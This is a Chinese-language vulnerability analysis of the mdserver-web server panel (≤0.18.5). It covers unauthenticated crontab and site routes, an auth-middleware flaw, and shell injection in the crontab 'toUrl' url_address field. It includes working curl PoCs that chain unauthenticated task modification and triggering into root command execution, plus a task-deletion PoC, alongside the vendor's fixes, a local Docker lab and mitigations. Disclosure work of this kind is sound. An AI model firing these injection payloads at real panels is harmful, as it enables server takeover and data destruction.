# mdserver-web ≤0.18.5 多处未授权访问 + 信息泄露 + RCE 漏洞分析

---

## 漏洞简介

**mdserver-web** 是一款基于 Python/Flask 开发的轻量级 Linux 服务器管理面板，提供网站管理、数据库管理、计划任务（Crontab）调度、文件管理、防火墙配置等功能，支持 Debian/Ubuntu/CentOS/Fedora 等主流 Linux 发行版，项目托管于 GitHub（[midoks/mdserver-web](https://github.com/midoks/mdserver-web)）。

在 commit **`33cabc8e2`（2026-04-15 17:33）** 之前的版本中，存在以下三类安全漏洞：

1. **多处未授权访问（Unauthenticated Access）**：`web/admin/crontab/__init__.py` 中 **8 个路由**在注册时漏写了 `@panel_login_required` 装饰器，任何未登录用户均可直接调用这些接口；`web/admin/site/site_default.py` 中 **1 个路由** 同样缺少认证装饰器。

2. **信息泄露（Information Disclosure）**：未授权的 `/site/get_site_doc` 接口会将服务器上 OpenResty/Nginx 配置文件的绝对路径直接返回给攻击者，从而暴露服务器目录结构。

3. **认证中间件缺陷 + Shell 注入 → 远程代码执行（RCE）**：`panel_login_required` 中存在危险默认值、IP 白名单从未校验、空指针异常等逻辑缺陷；计划任务 `toUrl` 类型将 `url_address` 参数直接拼入 Shell 命令，导致 Shell 注入 RCE。

上述漏洞链式组合：**在未获得任何认证凭据的情况下，攻击者即可对计划任务执行增删改查及立即触发，最终实现服务器任意命令执行。**

---

## 漏洞分析

### 一、漏洞发现思路

**（1）关注项目 PR 合并与 commit 差异**

通过审查 GitHub 仓库的 Pull Request 合并记录，发现 **PR #884**（commit `f5fda8b71`，2026-04-15 19:33）在合并前包含两个预备提交：

- `c508c71f6`（2026-04-15 19:28）：`Update __init__.py` —— 修改 `web/admin/crontab/__init__.py`
- `8586dbbe8`（2026-04-15 19:32）：`Update site_default.py` —— 修改 `web/admin/site/site_default.py`

这两个提交描述极为简短，但修改内容均涉及认证装饰器的添加，属于**安全补丁的典型特征**，引发重点关注。

**（2）逐行对比 commit diff，确认漏洞位置**

对比 `c508c71f6` 的 diff（见下方），发现该提交向 `web/admin/crontab/__init__.py` 中的 **8 个已有路由函数** 统一补加了 `@panel_login_required`——这意味着这 8 个路由在此之前**完全无需登录即可访问**。同理，`8586dbbe8` 的 diff 显示 `get_site_doc` 路由也补加了该装饰器。

**（3）追溯历史，确认缺陷引入时间**

进一步查阅 `web/admin/crontab/__init__.py` 的提交历史，确认漏洞自 **2024 年 11 月 20 日**（commit `8ae54e30d`，"update"）起引入，历经约 5 个月未被发现，直到 2026 年 4 月 15 日才由 PR #884 修复。

---

### 二、漏洞一：计划任务模块 8 个路由未授权访问

#### 漏洞 Commit（修复前的状态）

文件：`web/admin/crontab/__init__.py`（`33cabc8e2` 之前）

```python
blueprint = Blueprint('crontab', __name__, url_prefix='/crontab', ...)

@blueprint.route('/index')
@panel_login_required           # ✅ 有认证
def index(): ...

@blueprint.route('/list', methods=['POST'])
@panel_login_required           # ✅ 有认证
def list(): ...

# ─── 以下 8 个路由全部缺少 @panel_login_required ───

@blueprint.route('/logs', methods=['POST'])
def logs():                     # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().cronLog(cron_id)

@blueprint.route('/del', methods=['POST'])
def crontab_del():              # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().delete(cron_id)

@blueprint.route('/del_logs', methods=['POST'])
def del_logs():                 # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().delLogs(cron_id)

@blueprint.route('/set_cron_status', methods=['POST'])
def set_cron_status():          # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().setCronStatus(cron_id)

@blueprint.route('/get_data_list', methods=['POST'])
def get_data_list():            # ❌ 无认证
    stype = request.form.get('type', '')
    return MwCrontab.instance().getDataList(stype)

@blueprint.route('/get_crond_find', methods=['POST'])
def get_crond_find():           # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().getCrondFind(cron_id)

@blueprint.route('/modify_crond', methods=['POST'])
def modify_crond():             # ❌ 无认证（含 url_address 参数）
    request_data['url_address'] = request.form.get('url_address', '')
    ...
    return MwCrontab.instance().modifyCrond(cron_id, request_data)

@blueprint.route('/start_task', methods=['POST'])
def start_task():               # ❌ 无认证（立即触发执行）
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().startTask(cron_id)

@blueprint.route('/add', methods=['POST'])
@panel_login_required           # ✅ 有认证
def add(): ...
```

#### 未授权接口影响分析

| 接口路由 | HTTP 方法 | 功能 | 无认证危害 |
|---------|----------|------|----------|
| `/crontab/logs` | POST | 读取任务执行日志 | **信息泄露**：暴露服务器 cron 执行内容 |
| `/crontab/del` | POST | 删除计划任务 | **破坏性**：任意删除已有任务 |
| `/crontab/del_logs` | POST | 删除任务日志 | 清除痕迹 |
| `/crontab/set_cron_status` | POST | 启用/禁用任务 | 可禁用安全监控、备份等关键任务 |
| `/crontab/get_data_list` | POST | 获取网站/数据库列表 | **信息泄露**：暴露服务器托管资源 |
| `/crontab/get_crond_find` | POST | 获取单条任务详情 | **信息泄露**：任务脚本内容 |
| `/crontab/modify_crond` | POST | 修改计划任务 | **高危**：篡改任务脚本，结合 Shell 注入 → RCE |
| `/crontab/start_task` | POST | 立即触发任务执行 | **高危**：结合篡改接口，立即 RCE |

**关键点**：`/crontab/add`（添加任务）虽有认证保护，但 `/crontab/modify_crond`（修改任务）无认证，攻击者可以直接修改**已有任务**的 `url_address` 并通过 `/crontab/start_task` 触发，**无需添加新任务即可完成 RCE**。

#### 修复 Diff（commit `c508c71f6`）

```diff
 @blueprint.route('/logs', endpoint='logs', methods=['POST'])
+@panel_login_required
 def logs():

 @blueprint.route('/del', endpoint='del', methods=['POST'])
+@panel_login_required
 def crontab_del():

 @blueprint.route('/del_logs', endpoint='del_logs', methods=['POST'])
+@panel_login_required
 def del_logs():

 @blueprint.route('/set_cron_status', endpoint='set_cron_status', methods=['POST'])
+@panel_login_required
 def set_cron_status():

 @blueprint.route('/get_data_list', endpoint='get_data_list', methods=['POST'])
+@panel_login_required
 def get_data_list():

 @blueprint.route('/get_crond_find', endpoint='get_crond_find', methods=['POST'])
+@panel_login_required
 def get_crond_find():

 @blueprint.route('/modify_crond', endpoint='modify_crond', methods=['POST'])
+@panel_login_required
 def modify_crond():

 @blueprint.route('/start_task', endpoint='start_task', methods=['POST'])
+@panel_login_required
 def start_task():
```

---

### 三、漏洞二：`/site/get_site_doc` 未授权访问 + 信息泄露

#### 漏洞代码（`web/admin/site/site_default.py`，`33cabc8e2` 之前）

```python
@blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
# ❌ 缺少 @panel_login_required
def get_site_doc():
    stype = request.form.get('type', '0').strip()
    vlist = []
    vlist.append('')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/index.html')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/404.html')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/index.html')
    vlist.append(mw.getServerDir() + '/web_conf/stop/index.html')
    data = {}
    data['path'] = vlist[int(stype)]          # ← 直接返回服务器绝对路径
    return mw.returnData(True, 'ok', data)
```

#### 危害分析

1. **路径枚举**：`stype` 参数取值 0-4，对应不同路径，无认证即可遍历所有路径，泄露服务器 OpenResty/Nginx 的 webroot 和配置目录结构。
2. **整数越界**：若 `stype` 传入超出列表长度的值（如 `stype=99`），将触发 `IndexError`，导致 500 错误，同时暴露 Python 调用栈信息。
3. **作为 RCE 辅助**：攻击者可借此获取准确的文件路径，配合文件写入类漏洞实施更精确的攻击。

#### 修复 Diff（commit `8586dbbe8`）

```diff
 @blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
+@panel_login_required
 def get_site_doc():
```

---

### 四、漏洞三：认证中间件缺陷（`web/admin/user_login_check.py`）

#### 漏洞代码

```python
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id','')
        app_secret = request.headers.get('App-Secret','')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open":True})  # ← ①
            if panel_api['open']:
                return_code = 404
                info = thisdb.getAppByAppId(app_id)
                if app_secret != info['app_secret']:  # ← ②
                    return Response(status=int(return_code))
                return func(*args, **kwargs)  # ← ③ 完全跳过 Session 检查

        if not isLogined():
            ...
        return func(*args, **kwargs)
    return wrapper
```

| 标记 | 问题 |
|------|------|
| ① | **危险默认值**：`default={"open":True}`，数据库选项不存在时默认 API 为开启状态 |
| ② | **空指针**：`app_id` 不存在时 `info` 为 `None`，`None['app_secret']` 触发 `TypeError` → 500 |
| ③ | **IP 白名单未校验**：`white_list` 字段存入 DB 但鉴权代码中从未读取，白名单形同虚设 |

---

### 五、漏洞四：Shell 注入 → 远程代码执行（`web/utils/crontab.py`）

#### 漏洞代码

```python
def getShell(self, param):
    if stype == 'toUrl':
        # url_address 直接拼入 shell 命令，无任何转义
        shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"
```

`checkScript()` 的黑名单过滤（`shutdown`、`mkfs` 等）形同虚设，单引号闭合即可注入：

```
'; id > /tmp/pwned.txt; echo '
```

生成脚本：

```bash
curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
```

---

### 六、完整攻击链（无需任何已有凭据）

```
攻击者（未登录状态）
  │
  ├─[1]─ POST /crontab/get_data_list    ← 无认证
  │       type=site
  │       → 获取所有网站名称列表（信息收集）
  │
  ├─[2]─ POST /crontab/list            ← 需认证（但此接口有认证）
  │       → 若已有任务 ID（来自步骤1信息），跳至步骤3
  │       → 或直接猜测 ID（从 1 开始自增）
  │
  ├─[3]─ POST /crontab/modify_crond    ← 无认证 ⚠️
  │       id=<已有任务ID>
  │       stype=toUrl
  │       url_address='; id>/tmp/pwned.txt; echo '
  │       → 篡改已有计划任务，注入恶意 Shell
  │
  ├─[4]─ POST /crontab/start_task      ← 无认证 ⚠️
  │       id=<已有任务ID>
  │       → 立即触发执行
  │
  └─[RCE]─ 服务器执行任意命令 ✅（全程无需登录）
```

**注意**：步骤 2 中 `/crontab/list` 有认证要求，但可替换为：
- 直接从 1 开始暴力猜测 `id`（任务 ID 为自增整数，从 1 开始）
- 使用 `/crontab/get_crond_find`（无认证）枚举任务
- 通过 `/site/get_site_doc`（无认证）泄露路径后判断任务是否存在

---

## 环境搭建

> **优化说明**：官方 `docker/Dockerfile` 会编译安装 PHP 74、OpenResty、MySQL 5.6、phpMyAdmin，耗时约 30-60 分钟。本复现环境仅启动 Flask Web 面板（SQLite 数据库），**无需任何编译，构建时间约 2-5 分钟**。
>
> **漏洞版本锁定**：本环境基于 commit **`33cabc8e2`（2026-04-15 17:33）**，即 PR #883 合并后、PR #884 合并前的状态，包含所有未修复的漏洞。

### 前置条件

| 工具 | 版本要求 |
|------|---------|
| Docker | ≥ 20.10 |
| Docker Compose | ≥ 2.0（`docker compose` 命令） |
| 可用端口 | 7200 |

### 目录结构

```
docker/vuln/
├── Dockerfile          # 基于 python:3.11-slim，无编译依赖
├── docker-compose.yml  # 容器编排
├── entrypoint.sh       # 容器启动脚本（前台 gunicorn）
├── start.sh            # 一键启动
├── stop.sh             # 停止（保留数据）
├── clean.sh            # 完全清理（容器+镜像+网络+卷）
└── README.md           # 本文档
```

### 快速启动

```bash
# 克隆仓库（或使用已克隆版本）
git clone https://github.com/Mr-xn/mdserver-web.git
cd mdserver-web

# 赋予脚本执行权限
chmod +x docker/vuln/start.sh docker/vuln/stop.sh docker/vuln/clean.sh

# 一键启动漏洞环境
bash docker/vuln/start.sh
```

启动成功后终端输出示例：

```
================================================================
  ✅  环境已就绪
================================================================
  面板地址  : http://127.0.0.1:7200/AbCd1234
  用户名    : xk3mfp2a
  密码      : 9rqztwbn
  ℹ️  容器名  : mdserver-web-vuln
  ℹ️  查看日志: docker logs -f mdserver-web-vuln
================================================================
```

### 管理命令速查

```bash
# 启动
bash docker/vuln/start.sh

# 停止（保留数据卷，可再次 start 恢复）
bash docker/vuln/stop.sh

# 完全清理（删除容器 + 镜像 + 网络 + 所有挂载卷）
bash docker/vuln/clean.sh

# 手动进入容器
docker exec -it mdserver-web-vuln bash

# 实时查看面板日志
docker logs -f mdserver-web-vuln

# 查看初始密码
docker exec mdserver-web-vuln cat /www/server/mdserver-web/data/default.pl
```

### 验证漏洞版本（环境检查）

```bash
# 检查当前代码中的漏洞是否存在
docker exec mdserver-web-vuln grep -c "panel_login_required" \
  /www/server/mdserver-web/web/admin/crontab/__init__.py
# 漏洞版本输出: 3（仅 index、list、add 三处有认证）
# 修复版本输出: 11（全部路由有认证）
```

---

## 漏洞复现

> 以下 PoC **全程无需登录**，直接利用未授权路由完成攻击链。

### PoC 一：信息泄露（`/crontab/get_data_list` 未授权）

```bash
# 无需任何认证，直接获取服务器所有网站列表
curl -s -X POST http://127.0.0.1:7200/crontab/get_data_list \
  -d "type=site"
```

预期输出：返回 JSON 格式的网站名称列表，**无需登录即可获取服务器托管资源信息**。

```bash
# 获取数据库列表
curl -s -X POST http://127.0.0.1:7200/crontab/get_data_list \
  -d "type=database"
```

### PoC 二：信息泄露（`/site/get_site_doc` 未授权）

```bash
# 无需认证，泄露服务器 OpenResty/Nginx 配置文件绝对路径
for i in 1 2 3 4; do
  echo "stype=$i:"
  curl -s -X POST http://127.0.0.1:7200/site/get_site_doc \
    -d "type=$i" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('data',{}).get('path',''))"
done
```

预期输出：

```
stype=1: /www/server/openresty/nginx/html/index.html
stype=2: /www/server/openresty/nginx/html/404.html
stype=3: /www/server/openresty/nginx/html/index.html
stype=4: /www/server/web_conf/stop/index.html
```

**无需认证即可枚举服务器关键文件路径。**

### PoC 三：完整 RCE 利用链（全程无需登录）

#### Step 1：枚举已有计划任务 ID

```bash
# 尝试枚举 ID=1 的任务详情（无认证）
curl -s -X POST http://127.0.0.1:7200/crontab/get_crond_find \
  -d "id=1"
```

若 ID=1 不存在，可先通过登录面板（或其他方式）创建一条初始任务，或直接从 ID=1 递增枚举。

> **注意**：复现环境中可通过以下方式在容器内预先创建一条任务，以便演示无认证修改+触发：

```bash
# 在容器内以脚本方式创建初始任务（模拟已有计划任务场景）
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
import thisdb, core.mw as mw
from utils.crontab import crontab as MwCrontab

data = {
    'name': 'normal_backup_task',
    'type': 'day',
    'where1': '',
    'hour': '3',
    'minute': '0',
    'save': '7',
    'backup_to': 'localhost',
    'stype': 'toUrl',
    'sname': '',
    'sbody': '',
    'url_address': 'https://example.com',
    'attr': '',
}
tid = MwCrontab.instance().add(data)
print(f"[+] 已创建任务 ID: {tid}")
EOF
```

#### Step 2：无认证修改任务注入 Shell（`/crontab/modify_crond`）

```bash
# 全程无需认证！直接修改 ID=1 的任务，注入 Shell 命令
curl -s -X POST http://127.0.0.1:7200/crontab/modify_crond \
  -d "id=1" \
  -d "name=normal_backup_task" \
  -d "type=day" \
  -d "where1=" \
  -d "hour=3" \
  -d "minute=0" \
  -d "save=7" \
  -d "backup_to=localhost" \
  -d "stype=toUrl" \
  -d "sname=" \
  -d "sbody=" \
  --data-urlencode "url_address='; id > /tmp/pwned.txt; hostname >> /tmp/pwned.txt; echo '"
```

预期响应：`{"status": true, "msg": "修改成功"}`

#### Step 3：无认证立即触发执行（`/crontab/start_task`）

```bash
# 全程无需认证！立即触发任务执行
curl -s -X POST http://127.0.0.1:7200/crontab/start_task \
  -d "id=1"
```

预期响应：`{"status": true, "msg": "计划任务【normal_backup_task】已执行!"}`

#### Step 4：验证 RCE 结果

```bash
# 等待约 1 秒后验证
sleep 1
docker exec mdserver-web-vuln cat /tmp/pwned.txt
```

预期输出：

```
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
```

🎉 **全程无需任何登录凭据，通过两个无认证接口实现远程代码执行！**

### PoC 四：无认证删除计划任务（破坏性）

```bash
# 无需认证，直接删除 ID=1 的任务
curl -s -X POST http://127.0.0.1:7200/crontab/del \
  -d "id=1"
```

### PoC 五：认证中间件绕过（需已有 API 凭据）

若攻击者已获得 API 凭据（例如通过社工、配置泄露等），可进一步绕过仍有 `@panel_login_required` 的接口（如 `/crontab/list`、`/crontab/add`）：

```bash
# 首先开启 API 并创建凭据（需先登录面板，或利用其他漏洞）
# 然后用 API Key 绕过 Session 认证
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
```

---

## 漏洞修复

### 修复一：补全计划任务模块认证（`web/admin/crontab/__init__.py`）

**来自 commit `c508c71f6`（官方实际修复）**，向所有缺少认证的路由补加装饰器：

```python
# 以下 8 个路由均需补加 @panel_login_required

@blueprint.route('/logs', methods=['POST'])
@panel_login_required          # ← 新增
def logs(): ...

@blueprint.route('/del', methods=['POST'])
@panel_login_required          # ← 新增
def crontab_del(): ...

@blueprint.route('/del_logs', methods=['POST'])
@panel_login_required          # ← 新增
def del_logs(): ...

@blueprint.route('/set_cron_status', methods=['POST'])
@panel_login_required          # ← 新增
def set_cron_status(): ...

@blueprint.route('/get_data_list', methods=['POST'])
@panel_login_required          # ← 新增
def get_data_list(): ...

@blueprint.route('/get_crond_find', methods=['POST'])
@panel_login_required          # ← 新增
def get_crond_find(): ...

@blueprint.route('/modify_crond', methods=['POST'])
@panel_login_required          # ← 新增
def modify_crond(): ...

@blueprint.route('/start_task', methods=['POST'])
@panel_login_required          # ← 新增
def start_task(): ...
```

### 修复二：补全网站文档路由认证（`web/admin/site/site_default.py`）

**来自 commit `8586dbbe8`（官方实际修复）**：

```python
@blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
@panel_login_required          # ← 新增
def get_site_doc(): ...
```

### 修复三：完善认证中间件（`web/admin/user_login_check.py`）

```python
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id', '')
        app_secret = request.headers.get('App-Secret', '')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open": False})  # ← 修复①：危险默认值改为 False
            if panel_api['open']:
                info = thisdb.getAppByAppId(app_id)
                if info is None:                               # ← 修复②：空指针检查
                    return Response(status=404)
                if app_secret != info['app_secret']:
                    return Response(status=404)
                # ← 修复③：强制校验 IP 白名单
                white_list = info.get('white_list', '')
                if white_list and white_list != '0.0.0.0':
                    client_ip = mw.getClientIp()
                    allowed_ips = [ip.strip() for ip in white_list.split(',')]
                    if client_ip not in allowed_ips:
                        return Response(status=403)
                return func(*args, **kwargs)

        if not isLogined():
            # ... 原有逻辑不变
        return func(*args, **kwargs)
    return wrapper
```

### 修复四：Shell 注入修复（`web/utils/crontab.py`）

```python
import shlex

if stype == 'toUrl':
    # 修复前（漏洞）：直接字符串拼接
    # shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"

    # 修复后：使用 shlex.quote 进行 Shell 转义
    safe_url = shlex.quote(param['url_address'])
    shell = head + "curl -sS --connect-timeout 10 -m 60 " + safe_url
```

### 修复效果对比

| 攻击向量 | 修复前 | 修复后 |
|---------|--------|--------|
| 无认证访问 `/crontab/modify_crond` | ✅ 直接修改任务 | ❌ 需登录 |
| 无认证访问 `/crontab/start_task` | ✅ 直接触发执行 | ❌ 需登录 |
| 无认证访问 `/crontab/get_data_list` | ✅ 信息泄露 | ❌ 需登录 |
| 无认证访问 `/site/get_site_doc` | ✅ 路径泄露 | ❌ 需登录 |
| 无需 Session 携带 API Key 访问 | ✅ 认证绕过 | ❌ 需有效凭据 |
| 非白名单 IP 使用 API Key | ✅ 访问成功 | ❌ 403 拒绝 |
| `toUrl` 注入 Shell 命令 | ✅ RCE 成功 | ❌ 被转义 |

---

## 漏洞处置

### 受影响版本

| commit | 版本状态 | 说明 |
|--------|---------|------|
| ≤ `33cabc8e2` | ⚠️ 完全受影响 | 计划任务 8 个路由 + `/get_site_doc` 均无认证 |
| `c508c71f6` + `8586dbbe8` | ✅ 路由认证已修复 | PR #884，但认证中间件漏洞仍在 |
| `afdccefa9`（0.18.5） | ⚠️ 部分受影响 | 路由认证已修复，API Key 认证绕过仍在 |

### 临时缓解措施（治标）

在官方全量补丁发布前，**管理员可采取以下措施降低风险**：

1. **防火墙层面隔离**（最有效）：仅允许可信 IP 访问面板端口：
   ```bash
   # 仅允许特定 IP 访问面板
   ufw allow from <trusted_ip> to any port 7200
   ufw deny 7200
   ```

2. **关闭面板 API 功能**（防止 API Key 绕过）：
   ```bash
   docker exec -it mdserver-web-vuln python3 - << 'EOF'
   import sys, os, json
   os.chdir('/www/server/mdserver-web/web')
   sys.path.insert(0, '/www/server/mdserver-web/web')
   import thisdb
   thisdb.setOption('panel_api', json.dumps({'open': False}))
   print("[+] 面板 API 已关闭")
   EOF
   ```

3. **反向代理层添加认证**：在 Nginx/Caddy 前置代理上为面板路径统一添加 HTTP Basic Auth，作为双重保护。

4. **升级至修复版本**：更新到已包含 `c508c71f6` 和 `8586dbbe8` 的版本。

### 永久修复（治本）

```bash
# 停止并清理旧环境
bash docker/vuln/clean.sh

# 拉取已修复代码后重新构建
git pull origin main
bash docker/vuln/start.sh
```

---

## 参考链接

- 项目仓库：[https://github.com/midoks/mdserver-web](https://github.com/midoks/mdserver-web)
- 漏洞分析仓库（含 PoC）：[https://github.com/Mr-xn/mdserver-web](https://github.com/Mr-xn/mdserver-web)
- 关键修复 Commit：
  - `c508c71f6`：[Update __init__.py（计划任务路由补加认证）](https://github.com/midoks/mdserver-web/commit/c508c71f6)
  - `8586dbbe8`：[Update site_default.py（站点文档路由补加认证）](https://github.com/midoks/mdserver-web/commit/8586dbbe8)
- 受影响代码文件：
  - `web/admin/crontab/__init__.py`（8 个未授权路由）
  - `web/admin/site/site_default.py`（1 个未授权路由 + 信息泄露）
  - `web/admin/user_login_check.py`（认证中间件逻辑缺陷）
  - `web/utils/crontab.py`（Shell 注入 RCE）
- Python `shlex` 模块文档：[https://docs.python.org/3/library/shlex.html](https://docs.python.org/3/library/shlex.html)
- OWASP：[Missing Function Level Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- OWASP：[OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- CWE-306：[Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- CWE-200：[Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- CWE-78：[Improper Neutralization of Special Elements in OS Command](https://cwe.mitre.org/data/definitions/78.html)
